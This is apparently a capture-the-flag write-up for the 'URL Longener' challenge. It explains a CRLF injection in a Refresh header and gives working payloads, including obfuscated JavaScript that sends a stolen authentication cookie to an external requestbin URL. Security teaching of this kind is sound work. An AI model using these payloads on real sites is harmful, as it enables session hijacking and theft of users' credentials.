# URL Longener

## Description

Shou just wrote a short url generator to generate not so short urls.

Note 1: Flag is in the link admin created. Each user needs to be in the same IP and UA to get access their data.

Note 2: Server is running on a patched version to compensate the NGINX issue. Code here is solely for providing some insights. Do not test your payload on it.

## Solution

The [official writeup](https://github.com/shouc/wectf-2020#writeup---urllongener-crlf-injection--cors-misconf)
takes a much simpler route than we did, but we thought our CORS-free solution was interesting to consider.

When we create a link, we supply the URL that goes in a `Refresh` header sent to the link's visitors:
```python
location = html.escape(urllib.parse.unquote(location))
return 302, {"Refresh": "3; url=%s" % location}, "Redirecting you to %s in 3s..." % location
```
We quickly notice that we control the headers of the redirect response due to insufficient input validation.
We do this by inserting a URL-encoded newline into the location parameter. For example,
```
http://url.w-va.cf/redirect?location=http://google.com/#%0AContent-Type:%20text/javascript
```
does set the `Content-Type` header as shown. We considered what we could do with this, but did not think of CORS.
Instead, we jumped straight to manipulating the request body, which can be done by inserting two newlines instead of one:
```
http://url.w-va.cf/redirect?location=http://google.com/#%0A%0A<html>body</html>
```
Of course, this fails to do the desired thing due to location being `html.escape`d in the server code.

Now, to make things cleaner, we will just forgo the `http://google.com` URL entirely:
as it turns out, empty `url` in a `Refresh` header causes a simple refresh of the page instead of an error.

We eventually gave up on circumventing the escaping: `html.escape` seems to do its job properly.
This means that we cannot make the redirect serve an HTML page with a `script` tag.
But what if we use a server we control to serve a page that _sources a script_ from a redirect URL?
There is no obstacle to having JS code in the body. And indeed,
```html
<!DOCTYPE html>
<html lang="en">
<head>
<script src="http://url.w-va.cf/redirect?location=%0A%0Aalert('pwned');" />
</head>
</html>
```
does almost what we want, except for all the trailing garbage after our injection, such as the `Set-Cookie` header.

...

*Wait a second!*

The redirect page sends a `Set-Cookie` header.
This cookie is a timestamped JWT, but this turns out to not matter to us.
Our _goal_ is to pass for an admin, which means that we must match their fingerprint:
```python
@make_response
def get_index(req):
    fingerprint = base64.b64encode(str(req).encode("utf-8"))
    try:
        # get such user's array
        result = links[fingerprint]
```
where `make_response` ultimately does this, discarding the timestamp:
```python
def get_authorization(req):
    try:
        cookies = req[req.index("Cookie:") + 1:]
        for i in cookies:
            if "url_longener_auth" in i:
                return jwt.decode(i.split("=")[1], server_secret_key, algorithms=['HS256'])['token']
```
The other contents of the fingerprint basically just come from easily obtainable headers (`User-Agent`),
so it is sufficient for us to poach the cookie. We can do this by catching it into a string literal like so:
```js
function foo() {
  window.location = "http://requestbin.net/r/17z2eu81?c=" + content;
}
const content = `;foo()//
```
Why write it like this? Because the server-supplied response body also contains all of the payload after
the remaining headers, so the `Set-Cookie` will be caught into `content`, making the full response this:
```
[...]
Refresh: 3; url=

function foo() {
  window.location = "http://requestbin.net/r/17z2eu81?c=" + content;
}
const content = `;foo()//
Set-Cookie: url_longener_auth=[...]

Redirecting you to

function foo() {
  window.location = "http://requestbin.net/r/17z2eu81?c=" + content;
}
const content = `;foo()//
```
This is almost what we want, except that we're not allowed single or double quotes, and using backticks would break `content`.
There may have been a smarter solution, but we ended up just rewriting the code:
```js
function f(){a=[104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,105,110,46,110,101,116,47,114,47,49,55,122,50,101,117,56,49,63,99,61];s=a.map(function(c){return String.fromCharCode(c)}).join([]);location=s+btoa(t);}t=`;f()//
```
Now, finally, this is nearly all there was to it: after getting the JWT by serving the supplied [index.html](./index.html),
we run [request.py](./request.py) which sets the headers needed for the fingerprint.

The last step frustrated us somewhat, as we hadn't considered that we might not need `X-Forwarded-For`.
Sending what we got in `requestbin` would break the fingerprint, and the correct solution turned out to be omitting it.
